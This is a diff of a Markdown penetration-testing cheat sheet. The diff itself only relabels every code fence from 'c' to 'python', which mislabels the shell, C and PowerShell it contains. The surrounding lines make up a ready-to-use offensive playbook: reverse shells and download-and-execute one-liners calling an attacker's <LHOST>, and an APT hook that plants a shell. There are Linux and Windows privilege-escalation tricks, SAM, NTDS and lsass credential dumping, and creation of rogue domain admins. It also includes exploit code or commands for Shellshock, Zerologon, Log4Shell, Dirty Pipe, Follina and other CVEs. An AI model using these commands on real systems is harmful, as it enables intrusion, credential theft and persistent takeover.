 ###### Get NTLM from Password
 
-```c
+```python
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
 ```
 
 #### ldapsearch
 
-```c
+```python
 ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
 ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
 ldapsearch -x -h <RHOST> -s base namingcontexts
@@ -3311,7 +3311,7 @@ ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOS
 
 ##### Basic Linux Enumeration
 
-```c
+```python
 id
 sudo -l
 uname -a
@@ -3327,7 +3327,7 @@ ls -la /opt
 
 ##### find Commands
 
-```c
+```python
 find / -user <USERNAME> -ls 2>/dev/null
 find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
 find / -group <GROUP> 2>/dev/null
@@ -3341,7 +3341,7 @@ find ./ -type f -exec grep --color=always -i -I 'password' \{} \;    // search f
 
 ##### grep for Passwords
 
-```c
+```python
 grep -R db_passwd
 grep -roiE "password.\{20}"
 grep -oiE "password.\{20}" /etc/*.conf
@@ -3352,19 +3352,19 @@ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPa
 
 ###### Read first Line of a File with apache2 Binary
 
-```c
+```python
 sudo /usr/sbin/apache2 -f <FILE>
 ```
 
 ##### APT
 
-```c
+```python
 echo 'apt::Update::Pre-Invoke \{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
 ```
 
 ##### arua2c
 
-```c
+```python
 aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
 ```
 
@@ -3372,7 +3372,7 @@ aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allo
 
 - Bash <4.4
 
-```c
+```python
 env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
 ```
 
@@ -3380,7 +3380,7 @@ env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
 
 - Bash <4.2-048
 
-```c
+```python
 function /usr/sbin/<BINARY> \{ /bin/bash -p; }
 export -f /usr/sbin/<BINARY>
 /usr/sbin/<BINARY>
@@ -3392,7 +3392,7 @@ export -f /usr/sbin/<BINARY>
 
 ###### shell.c
 
-```c
+```python
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -3406,7 +3406,7 @@ void _init() \{
 
 or
 
-```c
+```python
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -3420,13 +3420,13 @@ system("/bin/sh");
 
 ###### Compiling
 
-```c
+```python
 gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
 ```
 
 ###### Privilege Escalation
 
-```c
+```python
 sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
 ```
 
@@ -3434,13 +3434,13 @@ sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
 
 ###### Get Information about Libraries
 
-```c
+```python
 ldd /PATH/TO/BINARY/<BINARY>
 ```
 
 ###### shell.c
 
-```c
+```python
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -3455,13 +3455,13 @@ void hijack() \{
 
 ###### Compiling
 
-```c
+```python
 gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
 ```
 
 ###### Privilege Escalation
 
-```c
+```python
 sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
 ```
 
@@ -3469,25 +3469,25 @@ sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
 
 > https://github.com/whotwagner/logrotten
 
-```c
+```python
 if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
 ```
 
 ###### If "create"-option is set in logrotate.cfg
 
-```c
+```python
 ./logrotten -p ./payloadfile /tmp/log/pwnme.log
 ```
 
 ###### If "compress"-option is set in logrotate.cfg
 
-```c
+```python
 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 ```
 
 ##### Path Variable Hijacking
 
-```c
+```python
 find / -perm -u=s -type f 2>/dev/null
 find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 export PATH=$(pwd):$PATH
@@ -3495,7 +3495,7 @@ export PATH=$(pwd):$PATH
 
 ##### PHP7.2
 
-```c
+```python
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
@@ -3503,7 +3503,7 @@ export PATH=$(pwd):$PATH
 
 The binary need to have the `SUID` bit set.
 
-```c
+```python
 /usr/sbin/relayd -C /etc/shadow
 ```
 
@@ -3513,7 +3513,7 @@ The binary need to have the `SUID` bit set.
 
 ###### shell.c
 
-```c
+```python
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -3526,7 +3526,7 @@ void _init() \{
 
 ###### Compiling
 
-```c
+```python
 gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
 ```
 
@@ -3537,37 +3537,37 @@ gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
 With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
 Instead of an option, it creates a file, named `--checkpoint=1`.
 
-```c
+```python
 touch -- --checkpoint=1
 ```
 
 or
 
-```c
+```python
 touch ./--checkpoint=1
 ```
 
 So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.
 
-```c
+```python
 touch -- '--checkpoint-action=exec=sh shell.sh'
 ```
 
 or 
 
-```c
+```python
 touch ./--checkpoint-action=exec=<FILE>
 ```
 
 To delete a misconfigured file, put a `./` in front of it.
 
-```c
+```python
 rm ./'--checkpoint-action=exec=python script.sh'
 ```
 
 ##### Writeable Directories in Linux
 
-```c
+```python
 /dev/shm
 /tmp
 ```
@@ -3576,7 +3576,7 @@ rm ./'--checkpoint-action=exec=python script.sh'
 
 ##### Basic Windows Enumeration
 
-```c
+```python
 systeminfo
 whoami /all
 net users
@@ -3619,19 +3619,19 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 
 ###### Checking File Permissions
 
-```c
+```python
 .\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
 ```
 
 ###### Checking Service Permissions
 
-```c
+```python
 .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
 ```
 
 ###### Checking Path Permissions to find Unquoted Service Paths
 
-```c
+```python
 .\accesschk.exe /accepteula -uwdq C:\
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
@@ -3639,13 +3639,13 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 
 ###### Checking Registry Entries
 
-```c
+```python
 .\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
 ```
 
 ##### Adding Users to Groups
 
-```c
+```python
 net user <USERNAME> <PASSWORD> /add /domain
 net group "Exchange Windows Permissions" /add <USERNAME>
 net localgroup "Remote Management Users" /add <USERNAME>
@@ -3653,14 +3653,14 @@ net localgroup "Remote Management Users" /add <USERNAME>
 
 ##### Enable Remote Desktop (RDP)
 
-```c
+```python
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
 
 or
 
-```c
+```python
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
@@ -3670,18 +3670,18 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
 
 ###### AlwaysInstallElevated
 
-```c
+```python
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
-```c
+```python
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
 ```
 
-```c
+```python
 msiexec /quiet /qn /i <FILE>.msi
 ```
 
@@ -3689,14 +3689,14 @@ msiexec /quiet /qn /i <FILE>.msi
 
 ###### Backup SAM and SYSTEM Hashes
 
-```c
+```python
 reg save hklm\system C:\Users\<USERNAME>\system.hive
 reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 ```
 
 ###### Dumping Hashes
 
-```c
+```python
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
@@ -3706,43 +3706,43 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 
 ###### Script for PowerShell Environment
 
-```c
+```python
 SET CONTEXT PERSISTENT NOWRITERSp
 add volume c: alias foobarp
 createp
 expose %foobar% z:p
 ```
 
-```c
+```python
 diskshadow /s <FILE>.txt
 ```
 
 ###### Copy ntds.dit
 
-```c
+```python
 Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
 ```
 
 ###### Export System Registry Value
 
-```c
+```python
 reg save HKLM\SYSTEM c:\temp\system
 ```
 
 ###### Extract the Hashes
 
-```c
+```python
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
 
 ###### Alternative Way via Robocopy
 
-```c
+```python
 reg save hklm\sam C:\temp\sam
 reg save hklm\system C:\temp\system
 ```
 
-```c
+```python
 set metadata C:\Windows\temp\meta.cabX
 set context clientaccessibleX
 set context persistentX
@@ -3753,26 +3753,26 @@ expose %cdrive% E:X
 end backupX
 ```
  
-```c
+```python
 diskshadow /s script.txt
 robocopy /b E:\Windows\ntds . ntds.dit
 ```
 
-```c
+```python
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
 
 ###### SeTakeOwnership Privilege
 
-```c
+```python
 takeown /f C:\Windows\System32\Utilman.exe
 ```
 
-```c
+```python
 icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
 ```
 
-```c
+```python
 C:\Windows\System32\> copy cmd.exe utilman.exe
 ```
 
@@ -3782,7 +3782,7 @@ Click the `Ease of Access` button on the logon screen to get a shell with `NT Au
 
 > https://github.com/antonioCoco/RogueWinRM
 
-```c
+```python
 .\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
 ```
 
@@ -3790,7 +3790,7 @@ Click the `Ease of Access` button on the logon screen to get a shell with `NT Au
 
 ###### Enable Colored Output
 
-```c
+```python
 reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 ```
 
@@ -3798,19 +3798,19 @@ Then open a new Terminal Window.
 
 ###### Check for Auto Run Programs
 
-```c
+```python
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
 
 ###### Get Registry Key Information
 
-```c
+```python
 req query <REGISTRY_KEY>
 ```
 
 ###### Modify Registry Key
 
-```c
+```python
 reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
 ```
 
@@ -3822,7 +3822,7 @@ reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\
 
 > https://www.nirsoft.net/utils/credentials_file_view.html
 
-```c
+```python
 cmdkey /list
 rundll32 keymgr.dll, KRShowKeyMgr
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
@@ -3831,34 +3831,34 @@ reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 
 ###### Search for Passwords
 
-```c
+```python
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
 ```
 
 ###### PowerShell History
 
-```c
+```python
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ###### Saved Windows Credentials
 
-```c
+```python
 cmdkey /list
 runas /savecred /user:<USERNAME> cmd.exe
 ```
 
 ###### Search the Registry for Passwords
 
-```c
+```python
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
 ###### Dumping Credentials
 
-```c
+```python
 reg save hklm\system system
 reg save hklm\sam sam
 reg.exe save hklm\sam c:\temp\sam.save
@@ -3868,27 +3868,27 @@ reg.exe save hklm\system c:\temp\system.save
 
 ###### Internet Information Service (IIS)
 
-```c
+```python
 C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
 ###### PuTTY
 
-```c
+```python
 reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
 ###### Lsass
 
-```c
+```python
 tasklist
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
 ```
 
 ###### Unattended Windows Installations
 
-```c
+```python
 C:\Unattend.xml
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattend\Unattend.xml
@@ -3898,7 +3898,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 
 ##### Insecure Service Permissions
 
-```c
+```python
 accesschk64.exe -qlc <SERVICE>
 icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
 sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
@@ -3908,7 +3908,7 @@ sc start <SERVICE>
 
 ##### Service Handling
 
-```c
+```python
 sc create <SERVICE_NAME>
 sc start <SERVICE_NAME>
 sc qc <SERVICE_NAME>
@@ -3916,7 +3916,7 @@ sc qc <SERVICE_NAME>
 
 ##### Scheduled Tasks
 
-```c
+```python
 schtasks
 schtasks /query /tn <TASK> /fo list /v
 schtasks /run /tn <TASK>
@@ -3927,14 +3927,14 @@ Get-ScheduledTask | where \{$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Ta
 
 Search for `Unquoted Service Paths` by using `sc qc`.
 
-```c
+```python
 sc qc
 sc qc <SERVICE>
 sc stop <SERVICE>
 sc start <SERVICE>
 ```
 
-```c
+```python
 icacls <PROGRAM>.exe
 icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
 icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
@@ -3944,7 +3944,7 @@ icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
 
 > https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
 
-```c
+```python
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
 Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
@@ -3952,7 +3952,7 @@ Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
 
 ##### WMIC
 
-```c
+```python
 wmic product get name,version,vendor
 wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
 ```
@@ -3963,7 +3963,7 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 
 > https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
 
-```c
+```python
 certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
 certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
 python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
@@ -3972,7 +3972,7 @@ evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
 
 #### PKINITtools
 
-```c
+```python
 python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
 export KRB5CCNAME=<USERNAME>.ccache
 python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
@@ -3980,19 +3980,19 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746e
 
 #### Port Scanning
 
-```c
+```python
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
 #### powercat
 
-```c
+```python
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
 ```
 
 #### Powermad
 
-```c
+```python
 Import-Module ./Powermad.ps1
 $secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
 New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
@@ -4002,7 +4002,7 @@ New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DO
 
 ##### Common Commands
 
-```c
+```python
 whoami /all
 getuserid
 systeminfo
@@ -4019,26 +4019,26 @@ type <FILE> | findstr /l <STRING>
 
 ##### Allow Script Execution
 
-```c
+```python
 Set-ExecutionPolicy remotesigned
 Set-ExecutionPolicy unrestricted
 ```
 
 ##### Script Execution Bypass
 
-```c
+```python
 powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ##### Import Module to PowerShell cmdlet
 
-```c
+```python
 Import-Module .\<FILE>
 ```
 
 ##### Check PowerShell Versions
 
-```c
+```python
 Set-ExecutionPolicy Unrestricted
 powershell -Command "$PSVersionTable.PSVersion"
 powershell -c "[Environment]::Is64BitProcess"
@@ -4046,38 +4046,38 @@ powershell -c "[Environment]::Is64BitProcess"
 
 ##### Read PowerShell History
 
-```c
+```python
 type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ##### Create a .zip File
 
-```c
+```python
 Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 ##### Unzip a File
 
-```c
+```python
 Expand-Archive -Force <FILE>.zip
 ```
 
 ##### Start a new Process
 
-```c
+```python
 Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
 ```
 
 ##### Invoke-Expression / Invoke-WebRequest
 
-```c
+```python
 IEX(IWR http://<LHOST>/<FILE>.ps1)
 Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 ```
 
 ##### .NET Reflection
 
-```c
+```python
 $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entryPointMethod = $assembly.GetTypes().Where(\{ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
@@ -4086,14 +4086,14 @@ $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 
 ##### Start offsec Session
 
-```c
+```python
 $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
 Enter-PSSession $offsec_session
 ```
 
 ##### Execute Command as another User
 
-```c
+```python
 $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
 $Session = New-PSSession -Credential $Cred
@@ -4102,7 +4102,7 @@ Invoke-Command -Session $session -scriptblock \{ whoami }
 
 or
 
-```c
+```python
 $username = '<USERNAME>'
 $password = '<PASSWORD>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -4110,13 +4110,13 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 Start-Process powershell.exe -Credential $credential
 ```
 
-```c
+```python
 powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
 ##### Add new Domain Administrator
 
-```c
+```python
 $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
 New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
 Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
@@ -4124,7 +4124,7 @@ Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
 
 ##### Execute Commands in User Context
 
-```c
+```python
 $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
 $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
 Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command \{whoami}
@@ -4132,7 +4132,7 @@ Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -creden
 
 ##### Execute Scripts with Credentials (Reverse Shell)
 
-```c
+```python
 $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
 Invoke-Command -Computer <RHOST> -ScriptBlock \{ IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
@@ -4140,12 +4140,12 @@ Invoke-Command -Computer <RHOST> -ScriptBlock \{ IEX(New-Object Net.WebClient).d
 
 #### pwncat
 
-```c
+```python
 (local) pwncat$ back    // get back to shell
 Ctrl+d                  // get back to pwncat shell
 ```
 
-```c
+```python
 pwncat-cs -lp <LPORT>
 (local) pwncat$ download /PATH/TO/FILE/<FILE> .
 (local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
@@ -4153,11 +4153,11 @@ pwncat-cs -lp <LPORT>
 
 #### rpcclient
 
-```c
+```python
 rpcclient -U "" <RHOST>
 ```
 
-```c
+```python
 dsr_getdcname
 dsr_getdcnameex
 dsr_getdcnameex2
@@ -4188,32 +4188,32 @@ srvinfo
 
 ##### Overpass the Hash
 
-```c
+```python
 .\Rubeus.exe kerberoast /user:<USERNAME>
 ```
 
 ##### Pass the Hash
 
-```c
+```python
 .\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
 ```
 
 #### RunasCs
 
-```c
+```python
 ./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
 ./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 ```
 
 #### smbpasswd
 
-```c
+```python
 smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
 ```
 
 #### winexe
 
-```c
+```python
 winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
 winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 ```
@@ -4222,7 +4222,7 @@ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 
 #### CVE-2014-6271: Shellshock RCE PoC
 
-```c
+```python
 curl -H 'Cookie: () \{ :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
 ```
 
@@ -4230,7 +4230,7 @@ curl -H 'Cookie: () \{ :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http:
 
 - exim version <= 4.84-3
 
-```c
+```python
 #!/bin/sh
 # CVE-2016-1531 exim <= 4.84-3 local root exploit
 # ===============================================
@@ -4266,7 +4266,7 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 
 ##### Exploitation
 
-```c
+```python
 !root:
 sudo -u#-1 /bin/bash
 ```
@@ -4279,7 +4279,7 @@ sudo -u#-1 /bin/bash
 
 ##### Prerequisites
 
-```c
+```python
 python3 -m pip install virtualenv
 python3 -m virtualenv venv
 source venv/bin/activate
@@ -4288,7 +4288,7 @@ pip install git+https://github.com/SecureAuthCorp/impacket
 
 ##### PoC Modification
 
-```c
+```python
     newPassRequest = nrpc.NetrServerPasswordSet2()
     newPassRequest['PrimaryName'] = dc_handle + '\x00'
     newPassRequest['AccountName'] = target_computer + '$\x00'
@@ -4304,7 +4304,7 @@ pip install git+https://github.com/SecureAuthCorp/impacket
 
 ##### Weaponized PoC
 
-```c
+```python
 #!/usr/bin/env python3
 
 from impacket.dcerpc.v5 import nrpc, epm
@@ -4406,7 +4406,7 @@ if __name__ == '__main__':
 
 ##### Execution
 
-```c
+```python
 python3 zerologon_tester.py <HANDLE> <RHOST>
 impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
@@ -4424,13 +4424,13 @@ impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 
 ##### Vulnerability Test
 
-```c
+```python
 sudoedit -s /
 ```
 
 The machine is vulnerable if one of the following message is shown.
 
-```c
+```python
 sudoedit: /: not a regular file
 segfault
 ```
@@ -4445,25 +4445,25 @@ Not vulnerable if the error message starts with `usage:`.
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
-```c
+```python
 tar -xvf jdk-8u20-linux-x64.tar.gz
 ```
 
 ##### Start the Listener
 
-```c
+```python
 python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
 ```
 
 ##### Execution
 
-```c
+```python
 $\{jndi:ldap://<LHOST>:1389/foobar}
 ```
 
 #### CVE-2022-0847: Dirty Pipe LPE
 
-```c
+```python
 gcc -o dirtypipe dirtypipe.c
 ./dirtypipe /etc/passwd 1 ootz:
 su rootz
@@ -4473,11 +4473,11 @@ su rootz
 
 > https://github.com/me2nuk/CVE-2022-22963
 
-```c
+```python
 curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
-```c
+```python
 curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
@@ -4485,19 +4485,19 @@ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-exp
 
 > https://github.com/JohnHammond/msdt-follina
 
-```c
+```python
 python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
 ```
 
-```c
+```python
 python3 -m http.server 8000
 ```
 
-```c
+```python
 nc -lnvp <LPORT>
 ```
 
-```c
+```python
 swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 ```
 
@@ -4507,7 +4507,7 @@ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 
 > https://www.openwall.com/lists/oss-security/2022/06/08/10
 
-```c
+```python
 #!/usr/bin/python3
 
 # Author: Matthias Gerstner <matthias.gerstner () suse com>
@@ -4746,14 +4746,14 @@ while True:
 
 #### First Terminal
 
-```c
+```python
 ./firejoin_py.bin
 You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
 ```
 
 #### Second Terminal
 
-```c
+```python
 firejail --join=193982
 su
 ```
@@ -4766,11 +4766,11 @@ su
 
 Modify the following file and build the solution.
 
-```c
+```python
 StorSvc\RpcClient\RpcClient\storsvc_c.c
 ```
 
-```c
+```python
 #if defined(_M_AMD64)
 
 //#define WIN10
@@ -4781,11 +4781,11 @@ StorSvc\RpcClient\RpcClient\storsvc_c.c
 
 Modify the following file and build the solution.
 
-```c
+```python
 StorSvc\SprintCSP\SprintCSP\main.c
 ```
 
-```c
+```python
 void DoStuff() \{
 
     // Replace all this code by your payload
@@ -4803,14 +4803,14 @@ void DoStuff() \{
 
 First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.
 
-```c
+```python
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
 LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 ```
 
 At least trigger `StorSvc` via `RpcClient.exe`.
 
-```c
+```python
 .\RpcClient.exe
 ```
 
@@ -4825,23 +4825,23 @@ At least trigger `StorSvc` via `RpcClient.exe`.
 
 ##### Example
 
-```c
+```python
 test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
 ```
 
 ##### Exploitation
 
-```c
+```python
 EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 ```
 
-```c
+```python
